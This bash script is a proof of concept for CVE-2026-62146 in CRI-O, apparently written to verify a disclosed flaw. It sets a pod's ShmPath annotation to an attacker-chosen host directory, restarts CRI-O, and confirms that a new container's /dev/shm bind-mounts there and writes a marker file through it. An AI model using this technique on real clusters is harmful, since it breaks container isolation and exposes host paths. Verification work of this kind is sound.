#!/usr/bin/env bash

set -euo pipefail

readonly CRIO_SOURCE=/src/cri-o
readonly TEST_ROOT=/var/tmp/sago-2026-0026-poc
readonly CRIO_ROOT="$TEST_ROOT/crio"
readonly CRIO_SOCKET="$CRIO_ROOT/crio.sock"
readonly CRIO_CONFIG="$CRIO_ROOT/crio.conf"
readonly CRIO_DROPINS="$CRIO_ROOT/crio.conf.d"
readonly CRIO_LOG="$CRIO_ROOT/crio.log"
readonly POD_CONFIG="$TEST_ROOT/pod.json"
readonly CONTAINER_BEFORE="$TEST_ROOT/container-before.json"
readonly CONTAINER_AFTER="$TEST_ROOT/container-after.json"
readonly ATTACKER_DIRECTORY="$TEST_ROOT/attacker-selected-directory"
readonly PAUSE_IMAGE=registry.k8s.io/pause@sha256:278fb9dbcca9518083ad1e11276933a2e96f23de604a3a08cc3c80002767d24c
readonly WORKLOAD_IMAGE=docker.io/library/busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662
RUN_ID=$(tr -d '\n' </proc/sys/kernel/random/uuid)
readonly RUN_ID
readonly CGROUP_PARENT="/sago-2026-0026-poc-$RUN_ID"

crio_pid=

fail() {
    printf '[FAIL] %s\n' "$*" >&2
    exit 1
}

cri() {
    crictl --runtime-endpoint "unix://$CRIO_SOCKET" --image-endpoint "unix://$CRIO_SOCKET" "$@"
}

stop_crio() {
    if [[ -n "$crio_pid" ]]; then
        kill "$crio_pid" >/dev/null 2>&1 || true
        wait "$crio_pid" >/dev/null 2>&1 || true
        crio_pid=
    fi
}

cleanup_resources() {
    local cleanup_failed=0
    if [[ -S "$CRIO_SOCKET" ]]; then
        cri rm -a -f >/dev/null 2>&1 || cleanup_failed=1
        cri rmp -a -f >/dev/null 2>&1 || cleanup_failed=1
    fi
    stop_crio
    if [[ -d "/sys/fs/cgroup$CGROUP_PARENT" ]] \
        && ! rmdir "/sys/fs/cgroup$CGROUP_PARENT" >/dev/null 2>&1; then
        cleanup_failed=1
    fi
    return "$cleanup_failed"
}

cleanup() {
    local exit_status=$?
    trap - EXIT INT TERM
    if ! cleanup_resources; then
        printf '[WARN] cleanup did not remove every verifier resource\n' >&2
        if ((exit_status == 0)); then
            exit_status=1
        fi
    fi
    exit "$exit_status"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

write_runtime_wrapper() {
    local wrapper="$CRIO_ROOT/crun-wrapper"
    cat >"$wrapper" <<'WRAPPER'
#!/bin/sh
set -eu

bundle=
previous=
for argument in "$@"; do
    if [ "$previous" = "-b" ] || [ "$previous" = "--bundle" ]; then
        bundle=$argument
    fi
    previous=$argument
done

if [ -n "$bundle" ] && [ -f "$bundle/config.json" ]; then
    sed -i 's/"ociVersion":[[:space:]]*"[^"]*"/"ociVersion": "1.0.0"/' "$bundle/config.json"
fi

exec /usr/bin/crun "$@"
WRAPPER
    chmod 0755 "$wrapper"
}

prepare_crio() {
    rm -rf "$TEST_ROOT"
    mkdir -p \
        "$ATTACKER_DIRECTORY" \
        "$CRIO_DROPINS" \
        "$CRIO_ROOT/attach" \
        "$CRIO_ROOT/exits" \
        "$CRIO_ROOT/hooks" \
        "$CRIO_ROOT/cni" \
        "$CRIO_ROOT/storage" \
        "$CRIO_ROOT/runroot"

    cat >"$CRIO_ROOT/policy.json" <<'POLICY'
{
  "default": [
    { "type": "insecureAcceptAnything" }
  ]
}
POLICY

    cat >/etc/crictl.yaml <<EOF
runtime-endpoint: unix://$CRIO_SOCKET
image-endpoint: unix://$CRIO_SOCKET
timeout: 30
debug: false
EOF

    "$CRIO_SOURCE/bin/crio" config --default >"$CRIO_CONFIG" 2>"$CRIO_ROOT/config.log"
    write_runtime_wrapper

    cat >"$CRIO_DROPINS/00-sago-2026-0026.conf" <<EOF
[crio.runtime]
cgroup_manager = "cgroupfs"
conmon = "/usr/bin/conmon"
default_runtime = "crun"
drop_infra_ctr = false
hooks_dir = ["$CRIO_ROOT/hooks"]
pause_image = "$PAUSE_IMAGE"
pinns_path = "$CRIO_SOURCE/bin/pinns"

[crio.runtime.runtimes.crun]
runtime_path = "$CRIO_ROOT/crun-wrapper"
runtime_type = "oci"

[crio.image]
signature_policy = "$CRIO_ROOT/policy.json"

[crio.network]
network_dir = "$CRIO_ROOT/cni"
plugin_dirs = ["/usr/lib/cni", "/opt/cni/bin"]
EOF
}

start_crio() {
    rm -f "$CRIO_SOCKET"
    "$CRIO_SOURCE/bin/crio" \
        --listen "$CRIO_SOCKET" \
        --container-attach-socket-dir "$CRIO_ROOT/attach" \
        --container-exits-dir "$CRIO_ROOT/exits" \
        --root "$CRIO_ROOT/storage" \
        --runroot "$CRIO_ROOT/runroot" \
        --storage-driver vfs \
        --config "$CRIO_CONFIG" \
        --config-dir "$CRIO_DROPINS" \
        --log-level info \
        >"$CRIO_LOG" 2>&1 &
    crio_pid=$!

    for _ in $(seq 1 90); do
        if cri info >/dev/null 2>&1; then
            return 0
        fi
        if ! kill -0 "$crio_pid" >/dev/null 2>&1; then
            sed -n '1,240p' "$CRIO_LOG" >&2
            fail "CRI-O exited during startup"
        fi
        sleep 1
    done

    sed -n '1,240p' "$CRIO_LOG" >&2
    fail "CRI-O did not become ready"
}

write_configs() {
    cat >"$POD_CONFIG" <<EOF
{
  "metadata": {
    "name": "sago-2026-0026",
    "uid": "sago-2026-0026",
    "namespace": "default",
    "attempt": 1
  },
  "hostname": "sago-2026-0026",
  "log_directory": "$CRIO_ROOT/logs",
  "annotations": {
    "io.kubernetes.cri-o.ShmPath": "$ATTACKER_DIRECTORY"
  },
  "linux": {
    "cgroup_parent": "$CGROUP_PARENT",
    "security_context": {
      "namespace_options": {
        "network": 2,
        "pid": 1,
        "ipc": 0
      }
    }
  }
}
EOF

    cat >"$CONTAINER_BEFORE" <<EOF
{
  "metadata": { "name": "before-restart", "attempt": 1 },
  "image": { "image": "$WORKLOAD_IMAGE", "user_specified_image": "$WORKLOAD_IMAGE" },
  "command": ["/bin/sh", "-c"],
  "args": ["sleep 600"],
  "log_path": "before-restart.log",
  "linux": { "security_context": { "run_as_user": { "value": 0 } } }
}
EOF

    jq '.metadata.name = "after-restart" | .log_path = "after-restart.log"' \
        "$CONTAINER_BEFORE" >"$CONTAINER_AFTER"
}

shm_source() {
    local container_id=$1
    cri inspect "$container_id" \
        | jq -r '.info.runtimeSpec.mounts[] | select(.destination == "/dev/shm") | .source'
}

printf '[*] CVE-2026-62146 proof of concept\n'
printf '[*] CRI-O commit: %s\n' "$(git -C "$CRIO_SOURCE" rev-parse HEAD)"
printf '[*] Kernel: %s\n' "$(uname -r)"

prepare_crio
write_configs
start_crio

cri pull "$PAUSE_IMAGE" >/dev/null
cri pull "$WORKLOAD_IMAGE" >/dev/null

pod_id=$(cri runp "$POD_CONFIG")
persisted_value=$(cri inspectp "$pod_id" \
    | jq -r '.info.runtimeSpec.annotations["io.kubernetes.cri-o.ShmPath"]')
[[ "$persisted_value" == "$ATTACKER_DIRECTORY" ]] \
    || fail "the attacker value was not persisted"
printf '[+] persisted ShmPath: %s\n' "$persisted_value"

before_id=$(cri create "$pod_id" "$CONTAINER_BEFORE" "$POD_CONFIG")
cri start "$before_id" >/dev/null
before_source=$(shm_source "$before_id")
case "$before_source" in
    "$CRIO_ROOT"/runroot/vfs-containers/*/userdata/shm) ;;
    *) fail "unexpected pre-restart /dev/shm source: $before_source" ;;
esac
[[ -d "$before_source" ]] || fail "the pre-restart /dev/shm source does not exist"
printf '[+] before restart: /dev/shm source is CRI-O-owned\n'
cri rm -f "$before_id" >/dev/null

stop_crio
start_crio

after_id=$(cri create "$pod_id" "$CONTAINER_AFTER" "$POD_CONFIG")
cri start "$after_id" >/dev/null
after_source=$(shm_source "$after_id")
[[ "$after_source" == "$ATTACKER_DIRECTORY" ]] \
    || fail "the persisted path was not restored after restart"
printf '[+] after restart: /dev/shm source = %s\n' "$after_source"

cri exec --sync "$after_id" /bin/sh -c \
    'printf "container-write-after-restart\n" > /dev/shm/proof.txt' >/dev/null
[[ $(<"$ATTACKER_DIRECTORY/proof.txt") == container-write-after-restart ]] \
    || fail "the container did not write through the poisoned mount"

printf '[+] host marker: %s\n' "$(<"$ATTACKER_DIRECTORY/proof.txt")"
if ! cleanup_resources; then
    trap - EXIT INT TERM
    fail "cleanup did not remove every verifier resource"
fi
trap - EXIT INT TERM
printf '[PASS] persisted sandbox state controlled the post-restart /dev/shm bind source\n'
